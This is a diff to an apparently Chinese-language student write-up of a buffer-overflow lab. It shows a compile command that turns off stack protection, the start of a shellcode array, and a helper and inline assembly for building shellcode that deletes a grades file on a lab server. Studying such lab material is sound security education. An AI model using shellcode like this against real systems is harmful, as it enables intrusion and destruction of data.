@@ -81,8 +81,9 @@ cat address.txt
 ![](http://i.imgur.com/AQ2GNAj.png)
 #Exercise6:
 　　实验过程如图所示，取得了控制权。
-　　`gcc -g -z execstack -fno-stack-protector -o stack2 stack2.c`
 ```
+gcc -g -z execstack -fno-stack-protector -o stack2 stack2.c
+代码：
 char shellcode[]=
   "\x31\xc0" 
   "\x50" 
@@ -181,6 +182,7 @@ char req[1069];
 
 　　先研究了create-shell.c文件中汇编指令之如何实现删除一个文件的，后来发现只需要把文件路径转化成十六进制的ascii码值，然后压栈，就可以完成删除工作，那么写了个小程序ascii.c把自己想要删除的文件路径转化成十六进制数据，然后写入create-shell.c文件中然后生成了shellcode，在放入test-shell.c文件中测试，发现成功啦！然后在写入shellcode进行攻击，终于攻击服务器成功了。
 ```
+ascii.c代码：
 int main()
 {
     char s[] = "0/home/seed/security/lab1-code/grades.txt";
@@ -193,12 +195,7 @@ int main()
     }
     return 0;
 }
-
-```
-![](http://i.imgur.com/5s5cQa2.png)  
-  
-
-```
+create_shellcode.c代码：
 __asm__(".globl mystart\n" 
 	  "mystart:\n"
 	  
@@ -226,7 +223,7 @@ __asm__(".globl mystart\n"
 	  "ret\n"
 	  );
 ```  
-
+![](http://i.imgur.com/5s5cQa2.png)
 ![](http://i.imgur.com/RwBFq2M.png)
 　　创建你的文件文件，运行./broswer程序之后，可以发现文件被成功删除。  
 
